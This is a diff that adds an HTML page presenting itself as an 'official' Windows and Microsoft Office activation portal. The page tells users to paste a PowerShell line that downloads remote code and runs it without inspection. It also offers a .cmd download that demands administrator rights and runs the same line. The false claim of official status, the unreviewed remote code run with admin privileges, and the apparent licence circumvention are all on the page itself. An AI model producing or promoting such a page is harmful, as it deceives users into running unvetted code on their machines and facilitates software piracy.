@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Windows & Microsoft Office Activation Portal</title>
+    <style>
+        :root {
+            --bg-color: #0f172a;
+            --card-bg: #1e293b;
+            --text-color: #f8fafc;
+            --text-muted: #94a3b8;
+            --accent-color: #38bdf8;
+            --accent-hover: #0ea5e9;
+            --border-color: #334155;
+            --code-bg: #090d16;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 2rem 1rem;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 900px;
+        }
+
+        header {
+            text-align: center;
+            margin-bottom: 2.5rem;
+        }
+
+        header h1 {
+            font-size: 2.25rem;
+            font-weight: 800;
+            margin-bottom: 0.5rem;
+            background: linear-gradient(to right, #38bdf8, #818cf8);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        header p {
+            color: var(--text-muted);
+            font-size: 1.1rem;
+        }
+
+        .card {
+            background-color: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 2rem;
+            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.3);
+            margin-bottom: 2rem;
+        }
+
+        .badge-container {
+            display: flex;
+            gap: 0.5rem;
+            flex-wrap: wrap;
+            margin-bottom: 1.5rem;
+        }
+
+        .badge {
+            background-color: rgba(56, 189, 248, 0.1);
+            color: var(--accent-color);
+            padding: 0.25rem 0.75rem;
+            border-radius: 9999px;
+            font-size: 0.85rem;
+            font-weight: 600;
+            border: 1px solid rgba(56, 189, 248, 0.2);
+        }
+
+        .instructions h3 {
+            font-size: 1.25rem;
+            margin-bottom: 1rem;
+            color: var(--text-color);
+        }
+
+        .instructions ol {
+            margin-left: 1.25rem;
+            color: var(--text-muted);
+            line-height: 1.6;
+            margin-bottom: 1.5rem;
+        }
+
+        .instructions li {
+            margin-bottom: 0.5rem;
+        }
+
+        .instructions strong {
+            color: var(--text-color);
+        }
+
+        .action-buttons {
+            display: flex;
+            gap: 1rem;
+            flex-wrap: wrap;
+        }
+
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            padding: 0.75rem 1.5rem;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+            text-decoration: none;
+            transition: background-color 0.2s, transform 0.1s;
+            border: none;
+            font-size: 0.95rem;
+        }
+
+        .btn-primary {
+            background-color: var(--accent-color);
+            color: #0f172a;
+        }
+
+        .btn-primary:hover {
+            background-color: var(--accent-hover);
+        }
+
+        .btn-secondary {
+            background-color: transparent;
+            color: var(--text-color);
+            border: 1px solid var(--border-color);
+        }
+
+        .btn-secondary:hover {
+            background-color: rgba(255, 255, 255, 0.05);
+        }
+
+        .script-viewer {
+            display: none;
+            margin-top: 1.5rem;
+        }
+
+        .script-viewer.active {
+            display: block;
+        }
+
+        .code-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background-color: #131b2e;
+            padding: 0.75rem 1rem;
+            border-top-left-radius: 8px;
+            border-top-right-radius: 8px;
+            border: 1px solid var(--border-color);
+            border-bottom: none;
+        }
+
+        .code-header span {
+            font-size: 0.85rem;
+            color: var(--text-muted);
+            font-family: monospace;
+        }
+
+        pre {
+            background-color: var(--code-bg);
+            border: 1px solid var(--border-color);
+            border-bottom-left-radius: 8px;
+            border-bottom-right-radius: 8px;
+            padding: 1rem;
+            overflow-x: auto;
+            max-height: 400px;
+            font-family: Consolas, Monaco, "Andale Mono", monospace;
+            font-size: 0.85rem;
+            color: #e2e8f0;
+            line-height: 1.5;
+        }
+
+        footer {
+            text-align: center;
+            color: var(--text-muted);
+            font-size: 0.85rem;
+            margin-top: auto;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <header>
+            <h1>Windows & Office Activator</h1>
+            <p>Official deployment and activation helper script for Windows 8, 8.1, 10, 11 and Microsoft Office.</p>
+        </header>
+
+        <main class="card">
+            <div class="badge-container">
+                <span class="badge">Windows 8 / 8.1</span>
+                <span class="badge">Windows 10</span>
+                <span class="badge">Windows 11</span>
+                <span class="badge">Microsoft Office</span>
+            </div>
+
+            <div class="instructions">
+                <h3>Quick Instructions</h3>
+                <ol>
+                    <li>Click the <strong>Start Menu</strong>, type <strong>PowerShell</strong>, and open it.</li>
+                    <li>Copy and paste the script command below and press <strong>Enter</strong>.</li>
+                    <li>Follow the interactive menu options in the terminal window.</li>
+                </ol>
+            </div>
+
+            <div class="action-buttons">
+                <button class="btn btn-primary" id="downloadBtn">
+                    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"/></svg>
+                    Download the Script
+                </button>
+                <button class="btn btn-secondary" id="toggleViewBtn">
+                    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M10 20l4-16m4 4l4 4-4 4M6 16l-4-4 4-4"/></svg>
+                    View the Script
+                </button>
+            </div>
+
+            <div class="script-viewer" id="scriptViewer">
+                <div class="code-header">
+                    <span>activation.ps1</span>
+                    <button class="btn btn-secondary" style="padding: 0.25rem 0.5rem; font-size: 0.75rem;" id="copyBtn">Copy Code</button>
+                </div>
+                <pre><code id="scriptContent">irm https://get.activated.win | iex</code></pre>
+            </div>
+        </main>
+
+        <footer>
+            <p>&copy; 2026 Activation Services. For educational and testing purposes only.</p>
+        </footer>
+    </div>
+
+    <script>
+        // The file payload matching the requested CMD wrapper execution structure
+        const downloadFileContent = `@echo off
+Title Windows and Microsoft Office Activation Tool
+:: Lisotech Activator Script Wrapper
+
+net session >nul 2>&1
+if %errorLevel% neq 0 (
+    echo [ERROR] Please run this script as Administrator!
+    pause
+    exit /b
+)
+
+powershell -Command "irm https://get.activated.win | iex"
+`;
+
+        const viewScriptContent = document.getElementById('scriptContent').innerText;
+
+        // Download functionality using 'Lisotech_Activators.cmd' filename
+        document.getElementById('downloadBtn').addEventListener('click', () => {
+            const blob = new Blob([downloadFileContent], { type: 'text/plain;charset=utf-8' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'Lisotech_Activators.cmd';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+        });
+
+        // Toggle script viewer visibility
+        const toggleBtn = document.getElementById('toggleViewBtn');
+        const scriptViewer = document.getElementById('scriptViewer');
+        
+        toggleBtn.addEventListener('click', () => {
+            scriptViewer.classList.toggle('active');
+            if (scriptViewer.classList.contains('active')) {
+                toggleBtn.textContent = 'Hide the Script';
+            } else {
+                toggleBtn.innerHTML = `<svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M10 20l4-16m4 4l4 4-4 4M6 16l-4-4 4-4"/></svg> View the Script`;
+            }
+        });
+
+        // Copy Code Functionality - restricts copied text strictly to target line
+        document.getElementById('copyBtn').addEventListener('click', () => {
+            navigator.clipboard.writeText(viewScriptContent).then(() => {
+                const btn = document.getElementById('copyBtn');
+                btn.textContent = 'Copied!';
+                setTimeout(() => {
+                    btn.textContent = 'Copy Code';
+                }, 2000);
+            });
+        });
+    </script>
+</body>
+</html>
